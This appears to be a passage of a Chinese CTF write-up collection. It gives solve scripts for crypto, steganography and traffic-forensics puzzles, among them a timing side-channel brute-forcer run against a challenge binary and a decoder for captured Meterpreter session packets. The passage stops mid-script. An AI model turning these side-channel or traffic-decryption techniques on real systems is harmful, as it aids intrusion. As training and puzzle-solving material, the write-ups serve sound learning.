&#39;UCU&#39;:&#39;S&#39;, \n        &#39;UUC&#39;:&#39;F&#39;, &#39;UUU&#39;:&#39;F&#39;, &#39;UUA&#39;:&#39;L&#39;, &#39;UUG&#39;:&#39;L&#39;, \n        &#39;UAC&#39;:&#39;Y&#39;, &#39;UAU&#39;:&#39;Y&#39;, &#39;UAA&#39;:&#39;_&#39;, &#39;UAG&#39;:&#39;_&#39;, \n        &#39;UGC&#39;:&#39;C&#39;, &#39;UGU&#39;:&#39;C&#39;, &#39;UGA&#39;:&#39;_&#39;, &#39;UGG&#39;:&#39;W&#39;, \n            &#125; \n    protein &#x3D;&quot;&quot; \n    if len(seq)%3 &#x3D;&#x3D; 0: \n        for i in range(0, len(seq), 3): \n            codon &#x3D; seq[i:i + 3] \n            protein+&#x3D; table[codon] \n    return protein \nprint(translate(seq))\n#flag&#123;I_REALLY_MISS_THE_ELDER_DAY&#125;\n\n题目：测信道初探\n\n\n\n\n\n\n\n\n参考：https://blog.csdn.net/weixin_46661122/article/details/109740368\n题目：pyHaHa\n\n\n\n\n\n\n\n\n参考：https://blog.csdn.net/weixin_44604541/article/details/112468128\n\n解压得到pyc文件，010editor查看发现文件倒序\n将文件倒序后，foremost分离得到压缩包，压缩包伪加密，\n打开伪加密的压缩包，得到map3文件，DeEgger Embedder隐写，\n得到base32的字符编码，解码得到无用的结果，尝试base32隐写，\n得到一串二进制数据，保存为encrypt文件参与解密脚本，\n得到新的二进制数据转为图片得到flag。\n\n题目：传感器2根据传感器1的结果，可以分析出来，编码的可以分为 0024D {ID} 41{校验位}\n0024D 8893CA58 41 810024D 8845ABF3 41 19由于校验位是8位二进制所以猜测是CRC8\n解题脚本：\n#!&#x2F;usr&#x2F;bin&#x2F;python\n\ndef crc(x,y):\n\twhile(x&gt;y):\n\t\tl &#x3D; len(bin(x)) - len(bin(y))\n\t\tt &#x3D; int(bin(y)[2:]+&#39;0&#39;*l,2)\n\t\tx ^&#x3D; t\n\treturn x\nm &#x3D; 0\nfor i in range(0x200):\n\tif i &lt; 100:\n\t\tcontinue\n\tif crc(0x24d8893ca584100,i) &#x3D;&#x3D; 0x81 and crc(0x24d8845abf34100,i) &#x3D;&#x3D; 0x19:\n\t\tm &#x3D; i\n\t\tprint(i)\n\t\tbreak\nprint(hex(crc(0x00024ddeadbeef4100,m)))\nprint(hex(crc(0x00024dbaada5554100,m)))\n\n题目：base编码def base01():\n    data&#x3D;&quot;.&#x2F;&quot;\n    files &#x3D; os.listdir(data)\n    l1&#x3D;[]\n    for file in files:\n        try:\n            f &#x3D; open(data+file)  # 返回一个文件对象\n            string &#x3D; f.read()  # 调用文件的 read()方法\n            t3&#x3D;base64.b16decode(string)\n            t2&#x3D;base64.b16decode(t3)\n            t1&#x3D;base64.b32decode(t2)\n            t0&#x3D;base64.b32decode(t1)\n            f.close()\n            print(t0)\n        except:\n            f.close()\n            print(file,&#39;file error!!&#39;)\n\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    base01()\n\n题目：Russian-zips压缩包伪加密得到mca文件。mca文件为游戏”MineCraft”的地图文件，下载游戏，将flag文件拖到游戏目录下的saves文件中。打开游戏得到flag。\n题目：简单的图片zsteg或者stegsolve得到。\n出题的是xsctf，猜测x，s，c，t，f分别对应着数字0，1，2，3，4\n[&#39;xxfxc&#39;, &#39;xxfst&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxfft&#39;, &#39;xxttc&#39;, &#39;xxffs&#39;, &#39;xxsft&#39;, &#39;xxftc&#39;, &#39;xxtfx&#39;, &#39;xxtfc&#39;, &#39;xxfcf&#39;, &#39;xxfxs&#39;, &#39;xxtfx&#39;, &#39;xxctx&#39;, &#39;xxfcx&#39;, &#39;xxtfx&#39;, &#39;xxsff&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxcxs&#39;, &#39;xxtfx&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxftx&#39;, &#39;xxfts&#39;, &#39;xxfxs&#39;, &#39;xxfcf&#39;, &#39;xxsfc&#39;, &#39;xsxxx&#39;]\n\n则以上数据可以改写为\n00402，00413，00342，00403，00443，00332，00441，00143，00432，\n00340，00342，00424，00401，00340，00230，00420，00340，00144，\n00414，00342，00403，00201，00340，00414，00342，00430，00431，\n00401，00424，00142，01000\n\n将5进制转化为十进制\n102，108，97，103，123，92，121，48\n117，95，97，114，101，95，65，110，\n95，49，109，97，103，51，95，109，\n97，115，116，101，114，47，125\n\n将十进制用ASCII码转化为字符\nflag&#123;\\y0u_are_An_1mag3_master&#x2F;&#125;\n\n题目：guess-xsctf\n\n\n\n\n\n\n\n\n参考：https://zhuanlan.zhihu.com/p/32848483Meltdown 攻击如果一次没跑出来就多跑几次。\nimport time, os\nTEST_COUNT &#x3D; 2\nLEN &#x3D; 16\nCHOICES &#x3D; &quot;0123456789abcdef&quot;\n\ndef check(prefix):\n  mxtime &#x3D; -1\n  res &#x3D; &#39;&#39;\n  for c in CHOICES:\n    cur &#x3D; prefix+c+&#39;0&#39;*(LEN-len(prefix)-1)\n    foo &#x3D; 0\n    for _ in range(TEST_COUNT):\n      start &#x3D; time.time()\n      os.system(f&quot;echo &#39;&#123;cur&#125;&#39; | .&#x2F;task &gt; &#x2F;dev&#x2F;null&quot;)\n      foo +&#x3D; (time.time()-start)\n    avgtime &#x3D; foo&#x2F;TEST_COUNT\n    if avgtime&gt;mxtime:\n      mxtime &#x3D; avgtime\n      res &#x3D; c\n  return res\n\n\ndef main():\n  prefix &#x3D; &#39;&#39;\n  for i in range(15):\n    c &#x3D; check(prefix)\n    prefix+&#x3D;c\n    print(c)\n  for c in CHOICES:\n    cur &#x3D; prefix+c\n    print(f&quot;------ trying &#123;cur&#125; --------&quot;)\n    os.system(f&quot;echo &#39;&#123;cur&#125;&#39; | .&#x2F;task&quot;)\n\nmain()\n\n\n\n\n\n\n\n\n\n\nflag{8c4afcb52e31da7}\n题目：clemency\n\n\n\n\n\n\n\n\n参考：https://www.52pojie.cn/thread-658507-1-1.html\n题目：北京地铁提示1:AES ECB密钥为小写字母提示2:密钥不足位用斜杠0补全提示3:不要光记得隐写不看图片本身啊\n\nstegslove或者zsteg图片隐写得到密文7SsQWmZ524i&#x2F;yVWoMeAIJA&#x3D;&#x3D;\n图片上魏公村的颜色不一样，密钥为weigongcun\n\n密文：7SsQWmZ524i&#x2F;yVWoMeAIJA&#x3D;&#x3D;\n解密：AES ECB Zero 128bits\n密钥：weigongcun\n明文：DDCTF&#123;Q*2!x@B0&#125;\n\n题目：再见李华1\n\n\n\n\n\n\n\n\n题目提示：假如你是李华（LiHua），收到乔帮主一封密信，没有任何特殊字符，请输入密码，不少于1000个字。同学，记得署名哦～\n没有特殊字符，是指密码中没有特殊字符。不少于1000个字，掩码是1000，最后署名，意思是密码中后面5位数是Lihua\n爆破????Lihua得到压缩包密码15CCLihua。\n题目：我们生活在南京-1音频反转，根据下表对应，得到flag{radiowavesacrosstime}\n\n题目：我们生活在南京-2分析频谱图，根据长短分别为1和0，摩斯密码解密\n..-. .-.. .- --. -.-. .-- .. ..... ....- - .-. ....- -.. .. - .. ----- -. -- ...-- - .... ----- -..\n\n得到flag{cwi54tr4diti0nm3th0d}\n题目：MulTzor题目给的16进制字符串最后少了个2\n完整的题目：\n38708d2a29ff535d9e3f20f85b40df3c3fab465b9a731ce55b54923279e85b4397362be25c54df2020f8465692733ce5535193363dab465b9a732eee41479a2137ab735f933a3cf8125a91730ee4405f9b730eea4013b61a79ff5d138d3638ef12408a312aff535d8b3a38e71252923c2ce54640df3c3fab7f5c8d203ca6515c9b363dab40529b3a36ab515c923e2ce55b509e2730e45c40df3c3fab465b9a7318f35b40df2336fc57418c732de35347df3b38ef12519a3637ab575d9c3a29e357419a3779fe415a913479ce5c5a983e38ab5f529c3b30e55740d1730de35b40df2a30ee5e579a3779e65b5f962738f94b13963d2dee5e5f96343ce55156df2431e2515bd37338e75d5d98732ee2465bdf2731ea4613992136e6125c8b3b3cf912579a302bf242479a3779ca4a5a8c732bea565a907338e556138b3635ee4241963d2dee40138b2138e5415e96202ae25d5d8c7f79fc5340df3430fd575ddf2731ee125090373ce5535e9a730ce746419e7d79df5a5a8c732eea41139c3c37f85b579a213cef125186732eee41479a2137ab61468f213ce65713be3f35e25757df1036e65f5291373cf91277883a3ee34613bb7d79ce5b409a3d31e445568d732de4125b9e253cab50569a3d79a956569c3a2ae24456dd732de41247973679ca5e5f96363dab445a9c2736f94b1df5590de35713ba3d30ec5f52df3e38e85a5a91362aab45568d3679ea12559e3e30e74b13903579fb5d418b323be757139c3a29e35741df3e38e85a5a91362aab455a8b3b79f95d47902179f851419e3e3be757418c7d79cc5d5c9b7336fb57419e2730e555138f2136e857578a213cf81e138f2136fb5741932a79ee5c5590213aee561fdf2436fe5e57df3b38fd571392323dee1247973679fb5e46983136ea4057df1637e2555e9e7334ea515b963d3cab475d9d213cea59529d3f3ca5127b90243cfd5741d37334e44147df3c3fab465b9a731eee405e9e3d79e65b5f962738f94b13993c2be85740d3732aee51419a2779f85741893a3aee41139e3d3dab515a893a35e2535ddf323eee5c5096362aab465b9e2779fe41569b731ce55b54923279ee5f43933c20ee56138f3c36f9125c8f362bea465a913479fb405c9c363dfe40568c7f79ea5c57df3a2dab45528c732de357409a7329e45d41df232be451569b262bee41138b3b38ff1252933f36fc5757df2731ee1276913a3ee6531392323ae35b5d9a2079ff5d139d3679f957459a212aee1f56913430e557568d363dab535d9b732de357139c3a29e357418c732de412519a732bee5357d15953df5a56df143cf95f52917329e747549d3c38f9561e9a222ce242439a3779ce5c5a983e38ab50569c3234ee127d9e2930ab75568d3e38e54b148c7329f95b5d9c3a29ea5e139c2120fb465cd22020f84656927d79c2461388322aab504190383ce5125186732de35713af3c35e2415bdf143ce557419e3f79d8465299357ef81270962331ee4013bd262bee5346df3a37ab76569c3634e95741df6260b8001fdf2430ff5a138b3b3cab535a9b7336ed12758d3637e85a1e8c2629fb5e5a9a3779e25c479a3f35e2555691303cab5f528b362be2535fdf3c3bff535a91363dab5441903e79ea12749a2134ea5c138c2320a51272df3e36e5465bdf313ced5d419a732de3571390262de940569e3879e45413a83c2be75613a8322bab7b7ad37338ff1252df3036e554568d3637e85713973635ef125d9a322bab65528d2038fc1e138b3b3cab625c933a2ae31270962331ee4013bd262bee5346df2031ea40569b7330ff4113ba3d30ec5f52d2312bee5358963d3eab46569c3b37e243469a2079ea5c57df273ce85a5d903f36ec4b13883a2de31247973679cd4056913031ab535d9b731bf95b47962031a512778a2130e555138b3b3cab75568d3e38e5125a912538f85b5c917336ed1263903f38e5561fdf3036f95713af3c35e2415bdf1030fb5a568d731bfe40569e2679fb57418c3c37e5575fdf243cf957139a2538e847528b363da71245963279d95d5e9e3d30ea1e138b3c79cd405291303cab455b9a213cab465b9a2a79ee41479e3135e2415b9a3779ff5a56df031aab70418a3d36ab415a983d38e74113963d2dee5e5f96343ce55156df202dea465a903d79fc5b4797731ff9575d9c3b79ed5350963f30ff5b568c732afe424390212da512608a303aee4140992635ab515c90233cf95347963c37ab535e903d3eab465b9a7309e45e568c7f79ff5a56df152bee5c50977f79ea5c57df2731ee12718d3a2de2415bdf322dab705f9a273ae35e56867309ea4058df3036e5465a91263cef1246912730e712798a3d3cab030acb6375ab455b9a3d79cd405291303cab41468d213ce556568d363dab465cdf2731ee12749a2134ea5c40d15953cd405c92732de35b40df313cec5b5d913a37ec1e138b3b3cab7041962730f85a13b83c2fee405d923637ff127090373cab535d9b731af2425b9a2179d8515b903c35ab1a74bc751ad81b139e2779c95e568b3031e7574adf0338f959139d2630e746138a2379ea5c139a2b2dee5c4096253cab514186232dea5c52932a2de251139c3229ea505a933a2df21c13b63d30ff5b52933f20a71247973679ef57508d2a29ff5b5c91732eea4113923230e55e4adf3c3fab7e4699272eea54559a7371cc5741923237ab535a8d733fe440509a7a79ea5c57df3279ed5744df1b3cee4013d7143cf95f52917338f95f4ad67334ee41409e343cf81e139e2079ff5a56df182be257548c3e38f95b5d9a7371cc5741923237ab5c52892a70ab575e8f3f36f25757df3e2ce85a13923c2bee12409a302cf957138f2136e857578a213cf81255902179fe415a913479ce5c5a983e38a51272933237ab66468d3a37ec1e139e731aea5f518d3a3dec5713aa3d30fd57418c3a2df2125e9e2731ee5f528b3a3ae2535ddf3237ef125f903430e85b52917f79fb405c893a3dee561392263ae3125c99732de35713902130ec5b5d9e3f79ff5a5a913830e555138b3b38ff125f9a3779ff5d138b3b3cab56568c3a3ee5125c99732de357139c2120fb4652913235f2465a9c3235ab505c92313cab5f529c3b30e55740df2731ea461388362bee125a91202df9475e9a3d2dea5e13963d79ee445691272cea5e5f86733bf95752943a37ec1247973679e553459e3f79ce5c5a983e38a5127b90243cfd5741d3732de35713b42130ee554092322be25c56df3a37ff405c9b263aee56139e3d79ce5c5a983e38ab44568d2030e45c13883a2de31252df3536fe404797732be4465c8d733fe4401396272aab671e9d3c38ff411fdf213cf8475f8b3a37ec125a917338ab4241903f36e555569b7329ee405a903779fc5a5691732de357409a7334ee41409e343cf81250902635ef125d902779e957139b363af94b438b363da51264962731ab465b9a733aea42478a213cab5d55df213ce757459e3d2dab515a8f3b3cf912589a2a2aab535d9b732de357138a203cab5d55df3e2ce85a1399322aff5741df060aab7c52892a79e95d5e9d362aa712419a342ce75341d3732bea425a9b732bee5357963d3eab5d55df0674e95d528b7334ee41409e343cf812419a202ce65757d15953df5a56df3535ea5513962063ab7677bc071ff002579c3638b806069d326dbd040bcf3169e90101cc3761ea0a02cf656db8570a82\n\n根据题目名称猜测是异或加密，用xortool尝试找出密钥：\n# 安装xortool\npip isntall xortool\n# 使用xortool\n# https:&#x2F;&#x2F;pypi.org&#x2F;project&#x2F;xortool&#x2F;\n\n提示说原文是英文，所以猜测最常用的字符是空格，\n添加参数-c 20或者-c &#39; &#39;得到如下信息：\n$ xortool -x rr.txt -c 20\nThe most probable key lengths:\n 3:  11.9%\n 6:  19.7%\n 9:   9.4%\n12:  14.5%\n15:   7.1%\n18:  11.2%\n21:   5.3%\n24:   8.4%\n30:   6.8%\n36:   5.7%\nKey-length can be 3*n\n1 possible key(s) of length 6:\nw3\\xffSY\\x8b\nFound 1 plaintexts with 95%+ valid characters\nSee files filename-key.csv, filename-char_used-perc_valid.csv\n\n根据xortools的结果，密钥应该是6位，查看生成的0.out文件，发现文件每6个字符里第一个都是错误的，猜测密钥的第一位错误。\n再看上面那句话，T-e应该为The，对 ‘-’ 和 ‘w’ 进行异或得原文字符为 ‘Z’，再对 ‘Z’ 和 ‘h’ 异或得密钥为 ‘2’。\n至此我们就得到了异或加密的密钥：23\\xffSY\\x8b\n编码和密码摩斯密码常用缩写\n\n\n\n\n\n\n\n\n摩尔斯电码和收发技术原理：https://www.elecfans.com/tongxin/rf/20100329212476.html\n例如：VYGUD在摩斯电码里是VERYGOOD(verygood)\n\n\n\n缩写\n含义\n\n\n\nA\nAll after(问号后用于请求重复)\n\n\nAB\nAll before (同样)\n\n\nARRL\nAmerican Radio Relay League (美国无线电中继联盟)\n\n\nABT\nAbout(关于)\n\n\nADS\nAddress(地址)\n\n\nAGN\nAgain(再一次)\n\n\nANT\nAntenna (天线)\n\n\nBN\nAll between (之间的所有)\n\n\nBUG\nSemiautomatic key (半自动的关键)\n\n\nC\nYes(是,好)\n\n\nCBA\nCallbook address(呼号手册)\n\n\nCFM\nConfirm(确认)\n\n\nCL\nCalling(拨打)\n\n\nCQ\nCalling any station(连络任一站台)\n\n\nCUL\nSee you later(待会见)\n\n\nCUZ\nBecause(因为)\n\n\nCW\nContinuous wave(连续波)\n\n\nCX\nConditions(状况)\n\n\nDE\nFrom(来自)\n\n\nDX\nDistance (sometimes refers to long distance contact)(长程通讯)\n\n\nES\nAnd (和)\n\n\nFB\nFine business (类似于“确定”)\n\n\nFCC\nFederal Communications Commission (美国联邦通信委员会)\n\n\nFER\nFor (为了)\n\n\nFREQ\nFrequency(频率)\n\n\nGA\nGood afternoon or Go ahead (depending on context)(午安)\n\n\nGE\nGood evening(晚安)\n\n\nGM\nGood morning(早安)\n\n\nGND\nGround (ground potential)(地表)\n\n\nGD\nGood(好)\n\n\nHI\nLaughter ()\n\n\nHR\nHere(这里)\n\n\nHV\nHave(有)\n\n\nLID\nPoor operator (可怜的运营商)\n\n\nMILS\nMilliamperes (毫安)\n\n\nNIL\nNothing (无)\n\n\nNR\nNumber (编号)\n\n\nOB\nOld boy (老男孩)\n\n\nOC\nOld chap (老兄)\n\n\nOM\nOld man (any male amateur radio operator is an OM)(任何男性业余无线电操作员是一个OM)\n\n\nOO\nOfficial Observer (官方观察员)\n\n\nOP\nOperator(操作员)\n\n\nOT\nOld timer(老手)\n\n\nOTC\nOld timers club (老前辈俱乐部)\n\n\nOOT\nold timers club (老老前辈俱乐部)\n\n\nPSE\nPlease(请)\n\n\nPWR\nPower(功率)\n\n\nQ\nQuarter Century Wireless Association (四分之一世纪无线协会)\n\n\nR\nI acknowledge or decimal point (承认或小数点)(根据上下文确定)\n\n\nRCVR\nReceiver(接收器)\n\n\nRPT\nRepeat or report)(重复或报告)(根据上下文确定)\n\n\nRST\nSignal report format (Readability-Signal Strength-Tone)(收讯指标)\n\n\nRTTY\nRadio teletype (无线电电传)\n\n\nRX\nReceive(接收)\n\n\nSAE\nSelf addressed envelope (自我处理的信封)\n\n\nSASE\nSelf addressed, stamped envelope (自我解决,盖章信封)\n\n\nSED\nSaid(说)\n\n\nSEZ\nSays (说)\n\n\nSIG\nSignal(讯号)\n\n\nSIGS\nSignals (信号)\n\n\nSKED\nSchedule(行程)\n\n\nSN\nSoon(很快&#x3D;不久将来)\n\n\nSOS\n(紧急呼救&#x3D;国际通用)\n\n\nSRI\nSorry(抱歉)\n\n\nSTN\nStation(电台)\n\n\nTEMP\nTemperature(气温)\n\n\nTMW\nTomorrow(明日)\n\n\nTNX\nThanks(感谢)\n\n\nTU\nThank you(感谢你)\n\n\nTX\nTransmit(发射器)\n\n\nU\nYou (你)\n\n\nUR\nYour or you’re (您或您已经)(根据上下文确定)\n\n\nURS\nYours (你的)\n\n\nVY\nVery (非常)\n\n\nWDS\nWords (词)\n\n\nWKD\nWorked (工作)\n\n\nWL\nWill (将)\n\n\nWUD\nWould (会)\n\n\nWX\nWeather(天气)\n\n\nXMTR\nTransmitter(发射机)\n\n\nXYL\nWife(妻子)\n\n\nYL\nYoung lady (used of any female)(年轻女子)\n\n\n73\nBest regards(最好的祝福)\n\n\n88\nLove and kisses(爱与吻之告别)(注意应该使用在“异性”之间)\n\n\n99\ngo way(被要求离开,非友善)\n\n\nOTP加密\n\n\n\n\n\n\n\n\n参考：https://cloud.tencent.com/developer/article/2204722\njwt（JSON Web Token）- 数据包session\n\n\n\n\n\n\n\n\nhttps://juejin.cn/post/7029961576270528543参考：基于jwt的token验证、原理及流程\n&lt;!--例如--&gt;\n密文：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJoaW50IjoiZm9yIHNlY3VyaXR5LCBJIHNldCBteSBwYXNzd29yZCBhcyBhIHdlYnNpdGUgd2hpY2ggaSBqdXN0IHBpbmdlZCBiZWZvcmUifQ.P3xOErNrUkYqdMBoo8WvU63kUVyOkZjiTK-hwOIIS5A\n明文：\n&#123;\n    &quot;hint&quot;: &quot;for security, I set my password as a website which i just pinged before&quot;\n&#125;\n\n题目：EASY_EVM\n\n\n\n\n\n\n\n\n以下是官方wp。\n考点是EVM逆向，中间夹杂了中国剩余定理的知识\n改了一下bytecode使得不能反编译，可以自己手动改过来反编译，也可以直接分析opcode\npragma solidity ^0.5.0;\n\ncontract EASY_EVM_CRYPTO&#123;\n    \n    &#x2F;&#x2F; flag &#x3D; &quot;flag&#123;An_E4sy_EVM_y0u_sO1ve_it!&#125;&quot;\n    string private FLAG;\n    uint private x;\n    uint private y;\n    uint private z;\n    \n    &#x2F;&#x2F; flag &#x3D; 0x666c61677b416e5f453473795f45564d5f7930755f734f3176655f6974217d\n    constructor() public payable &#123;\n        x &#x3D; 231412341286754812414291;\n        y &#x3D; 126381254785148123414597;\n        z &#x3D; 438712649816519864511367;\n    &#125;\n    \n    function GetFlag() public view returns (string memory flag) &#123;\n        assembly &#123;\n            flag :&#x3D; sload(0)\n        &#125;\n    &#125;\n    \n    function Convert(string memory source) public pure returns (uint result) &#123;\n        bytes32 tmp;\n        assembly &#123;\n            tmp :&#x3D; mload(add(source, 32))\n        &#125;\n        result &#x3D; uint(tmp) &#x2F; 0x100;\n    &#125;\n    \n    function Require() public view &#123;\n        uint tmp &#x3D; Convert(FLAG);\n        require(tmp%x &#x3D;&#x3D; 193913535844325315514675);\n        require(tmp%y &#x3D;&#x3D; 59349569214207838388981);\n        require(tmp%z &#x3D;&#x3D; 153559101645126489682469);\n    &#125;\n&#125;\n\n需要注意的是，x、y、z的值可从initialization code获得\n然后便是中国剩余定理的知识，简单的密码学\nfrom functools import reduce\nfrom Crypto.Util.number import long_to_bytes,bytes_to_long\n\ndef egcd(a, b):\n    if 0 &#x3D;&#x3D; b:\n        return 1, 0, a\n    x, y, q &#x3D; egcd(b, a % b)\n    x, y &#x3D; y, (x - a &#x2F;&#x2F; b * y)\n    return x, y, q\n\ndef chinese_remainder(pairs):\n    mod_list, remainder_list &#x3D; [p[0] for p in pairs], [p[1] for p in pairs]\n    mod_product &#x3D; reduce(lambda x, y: x * y, mod_list)\n    mi_list &#x3D; [mod_product&#x2F;&#x2F;x for x in mod_list]\n    mi_inverse &#x3D; [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))]\n    x &#x3D; 0\n    for i in range(len(remainder_list)):\n        x +&#x3D; mi_list[i] * mi_inverse[i] * remainder_list[i]\n        x %&#x3D; mod_product\n    return x\n\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    result &#x3D; chinese_remainder([(231412341286754812414291, 193913535844325315514675), (126381254785148123414597, 59349569214207838388981), (438712649816519864511367, 153559101645126489682469)])\n    Least_common_multiple &#x3D; 231412341286754812414291 * 126381254785148123414597 * 438712649816519864511367\n    for i in range(1, 100000):\n        print i\n        flag &#x3D; Least_common_multiple * i + result\n        flag &#x3D; long_to_bytes(flag)\n        if &#39;flag&#123;&#39; in flag:\n            print(flag)\n            break\n\n\n\n\n\n\n\n\n\n\nflag{An_E4sy_EVM_y0u_sO1ve_it!}\n隐写术DeEgger Embedder隐写\n\n\n\n\n\n\n\n\n下载网址：http://deegger-embedder.findmysoft.com/download/\nbase64&#x2F;base32隐写\n\n\n\n\n\n\n\n\n这个应该很久之前就写的，但是刚刚才发现前面竟然没写。有一个Base-Tool.exe的工具很好用，但是我找不到它的下载网址了。实在不行用脚本或者在线网址也行，网站上能搜到的。原理都是一样的。如果base解密出来的结果不符合预期可以尝试这个。\nc++隐写(文本隐写)观察，代码间有奇怪的间距，空格为0，制表符为1，解题脚本：\nwith open(&#39;2.cpp&#39;) as aaa:\n    sum &#x3D; []\n    for aa in aaa:\n        s &#x3D; &#39;&#39;\n        for a in aa:\n            if a &#x3D;&#x3D; &#39; &#39;:\n                s +&#x3D; &#39;0&#39;\n            elif a &#x3D;&#x3D; &#39;\\t&#39;:\n                s +&#x3D; &#39;1&#39;\n        if len(s) &gt;&#x3D; 6:\n            sum.append(s)\n    print(sum)\n    for ss in sum:\n        print(chr(int(ss,2)),end&#x3D;&#39;&#39;)\n\nwireshark流量分析题目：功夫再高也怕菜刀\nforemost分离得到压缩包文件，需要密码不是伪加密。\n\n分组字节流查找flag，追踪流，注意菜刀流量特征z1，找到FFD8开头的jpg图片文件数据流。\n\n保存图片文件打开得到密码，解压得到压缩包。\n\n\n手动提取文件例如：手动提取zip文件，Ctrl+F，分组列表，16进制值，搜索504B0304，保存为zip文件。\npyshark使用import pyshark\n\ncap &#x3D; pyshark.FileCapture(&quot;tunnel.pcap&quot;, display_filter&#x3D;&quot;dns &amp;&amp; ip.dst &#x3D;&#x3D; 8.8.8.8 &amp;&amp; \\\ndns.qry.type &#x3D;&#x3D; 1&quot;, tshark_path&#x3D;&quot;D:&#x2F;Program Files&#x2F;Wireshark&#x2F;tshark.exe&quot;)\n\nwith open(&quot;base64_str.txt&quot;, &quot;w&quot;) as f:\n    for c in cap:\n        base64_str &#x3D; str(c.dns.qry_name).split(&quot;.&quot;)[0]\n        f.write(base64_str + &quot;\\n&quot;)\n\n题目：抓住个黑客\n\n\n\n\n\n\n\n\n参考：https://www.modb.pro/db/120308参考：https://www.cnblogs.com/chusiyong/p/12191108.html没做出来，看了一些资料，还是不会，以下是官方wp。\nMeterpreter的默认通信协议\nValues: [XOR KEY][session guid][encryption flags][packet length][packet type][ .... TLV packets go here .... ]\nSize:   [   4   ][    16      ][      4       ][       4     ][     4     ][ ....          N          .... ]\n\n用开始的4字节异或密钥对后续报文进行异或解密，得到32字节的报文头。然后如果无加密，则是TLV报文；不然就是16自己的IV，然后是TLV报文。\ndef DECPAK(PKT, AES_key &#x3D; None):\n    PKT &#x3D; PKT.decode(&quot;hex&quot;)\n    PKT_dec &#x3D; &quot;&quot;\n    XOR_KEY &#x3D; PKT[:4]\n    #PKT_dec +&#x3D; p32(XOR_KEY)\n    for i in range(0, len(PKT)):\n        deced &#x3D; chr(ord(PKT[i]) ^ ord(XOR_KEY[i % 4]))\n        PKT_dec +&#x3D; deced\n\n    PKT_ret&#x3D;&#123;&#125;\n    PKT_ret[&quot;XOR_KEY&quot;] &#x3D; XOR_KEY\n    PKT_ret[&quot;GUID&quot;] &#x3D; PKT_dec[4:4+16]\n    PKT_ret[&quot;ENC_FLAGS&quot;] &#x3D; u32(PKT_dec[20:24][::-1])\n    PKT_ret[&quot;PKT_LENGTH&quot;] &#x3D; u32(PKT_dec[24:28][::-1])\n    PKT_ret[&quot;PKT_TYPE&quot;] &#x3D; u32(PKT_dec[28:32][::-1])\n    PKT_ret[&quot;TLVS&quot;] &#x3D; []\n\n    pos &#x3D; 32\n    if PKT_ret[&quot;ENC_FLAGS&quot;] &#x3D;&#x3D; 0:\n        while pos &lt; len(PKT_dec):\n            #print PKT_dec[pos:].encode(&quot;hex&quot;)\n            tlv_len &#x3D; u32(PKT_dec[pos: pos + 4][::-1])\n            tlv_type &#x3D; u32(PKT_dec[pos + 4: pos + 8][::-1])\n            tlv_content &#x3D; PKT_dec[pos + 8: pos + tlv_len]\n            pos +&#x3D; tlv_len\n            PKT_ret[&quot;TLVS&quot;].append([tlv_len, tlv_type, tlv_content])\n    elif PKT_ret[&quot;ENC_FLAGS&quot;] &#x3D;&#x3D; 1 and AES_key !&#x3D; None:\n        PKT_ret[&quot;IV&quot;] &#x3D; PKT_dec[pos: pos + 16]\n        aes_cipher &#x3D; AESCipher(AES_key, PKT_ret[&quot;IV&quot;])\n        PKT_dec &#x3D; PKT_dec[ :32 + 16] + aes_cipher.decrypt(PKT_dec[32 + 16: ])\n        pos +&#x3D; 16\n        while pos &lt; len(PKT_dec):\n            #print PKT_dec[pos:].encode(&quot;hex&quot;)\n            tlv_len &#x3D; u32(PKT_dec[pos: pos + 4][::-1])\n            tlv_type &#x3D; u32(PKT_dec[pos + 4: pos + 8][::-1])\n            tlv_content &#x3D; PKT_dec[pos + 8: pos + tlv_len]\n            pos +&#x3D; tlv_len\n            PKT_ret[&quot;TLVS&quot;].append([tlv_len, tlv_type, tlv_content])\n\n    return PKT_ret\n\n首先Meterpreter主机会向被控端发送公钥，这部分默认是不加密的，本题给了私钥，所以公钥就没有必要用了。\n然后被控端根据公钥，对AES256的密钥进行加密，发送给服务端。\n服务端和被控端接下来就根据IV对密文进行打乱，互相使用AES256密钥解密。\n依照这个思路，我们对报文进行追踪，解密出AES256的密钥。从后往前解包查找攻击者的命令。\nAES_PAK &#x3D; DECPAK(&quot;2926993adf8c06b90319d8059f51ec99b401f9b42926993a292698b52926993b2926991c2927993b4a49eb5f7648fc5d4652f05b5d43c64e4550c65f4745eb435952f0554726993a290f993b2924ac0e181fac0f1110a90d1f10ab031e13ac081b16aa0f1a16a0031813af0a1f15993a2926953a2b24be3a2926983a2927913a2d24b039ec75e27c93f3e0167fb28dd2c98ea0fd2ff42887d961f4e205a619311cf4b8dd93f189d24b8eb45af277bc76cc0ea8d5a0b3332812e6c8f73cced9f1d32189311dc13c30b80ebf944228979fd974a6ce23aacf386ebb5dbc1ac414a49678e6425944edf4a56f263a9c9e2a80e4d1884b35fc8da6e68bff64d33265350bf3e2b72dc5b0f0580cc12925074fc5505c9cd250b279150b9701cf5b2666ae9d0a0722f8b72aed8ffaa51f43594ebebe13b5bcb75e8a33c8cd396445c0c9da3d5a5b862bde38f62d13afd5387a62abce70e3d4192e3e96996ceaa0d1b0c7796028bdeabfbd8eddd13576f23135e1e7b06a0057a4b07bc786394ba1cd691547fad5db3a2926953a2b269d3a2926993a2926813a2d27542832d93a2fb12d08349729256baeb187&quot;)\nprint AES_PAK\n\nAES_key_enc &#x3D; AES_PAK[&quot;TLVS&quot;][3][2]\n\nAES_key &#x3D; rsa_decode(AES_key_enc, privkey_pem)\n\nprint AES_key.encode(&quot;hex&quot;), len(AES_key)\n\nprint DECPAK(&quot;7e30af14889a3097540fee2bc847dab7e317cf9a7e30af157e30af7c7e30af144a1999b733e68b894ee6b64581a31e4f800f1e2413c6ffabc4690df0ffdf5ad592f3d3de710b43f85611c113dff2d03a4a91fc6cf046cafc37d823f986dee137e05368e717be6acbd31e87435f8bc7601dae969be7b5888050246f2f01b9cab8&quot;)\n\nprint 